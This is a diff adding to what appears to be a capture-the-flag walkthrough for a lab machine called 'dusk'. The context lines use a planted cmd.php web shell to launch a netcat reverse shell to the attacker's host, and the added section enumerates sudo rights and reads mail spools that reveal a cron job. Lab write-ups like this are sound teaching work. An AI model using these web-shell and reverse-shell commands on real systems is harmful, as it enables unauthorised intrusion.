@@ -66,3 +66,43 @@ Query OK, 1 row affected (0.001 sec)
 Then going to the php site, sure enough cmd.php was there. Browsing to it with `192.168.53.6:8080/cmd.php?cmd=ls` ran ls successfully. Time for a reverse netcat shell!
 
 `192.168.53.6:8080/cmd.php?cmd=nc%20192.168.53.4%204444%20-e%20/bin/bash` plus `nc -nvlp 4444` in another prompt got me a reverse nc, then `python -c "import pty;pty.spawn('/bin/bash');"` got me a nice shell.
+
+## On machine enumeration
+
+As `www-data`, I ran `sudo -l`:
+
+```
+Matching Defaults entries for www-data on dusk:
+    env_reset, mail_badpass,
+    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin
+
+User www-data may run the following commands on dusk:
+    (dusk) NOPASSWD: /usr/bin/ping, /usr/bin/make, /usr/bin/sl
+```
+
+`ping` and `sl` won't provide anything. `make` looked promising, but even though I can execute commands with it they don't run as dusk, just me as www-data.
+
+However, given this server has smtp, I browsed to /var/spool/mail and found three files, for dusk, root and www-data. I copied this into /var/tmp so I could read it better, and it contains many messages that are identical (except for time):
+
+```
+From www-data@dusk.dusk  Sat Nov 30 17:50:02 2019
+Return-Path: <www-data@dusk.dusk>
+X-Original-To: www-data
+Delivered-To: www-data@dusk.dusk
+Received: by dusk.dusk (Postfix, from userid 33)
+	id 17C671824; Sat, 30 Nov 2019 17:50:01 -0500 (EST)
+From: root@dusk.dusk (Cron Daemon)
+To: www-data@dusk.dusk
+Subject: Cron <www-data@dusk> /usr/bin/php -S 192.168.1.167:8080 -t /tmp
+MIME-Version: 1.0
+Content-Type: text/plain; charset=UTF-8
+Content-Transfer-Encoding: 8bit
+X-Cron-Env: <SHELL=/bin/sh>
+X-Cron-Env: <HOME=/var/www>
+X-Cron-Env: <PATH=/usr/bin:/bin>
+X-Cron-Env: <LOGNAME=www-data>
+Message-Id: <20191130225002.17C671824@dusk.dusk>
+Date: Sat, 30 Nov 2019 17:50:01 -0500 (EST)
+
+[Sat Nov 30 17:50:01 2019] Failed to listen on 192.168.1.167:8080 (reason: Address already in use)
+```
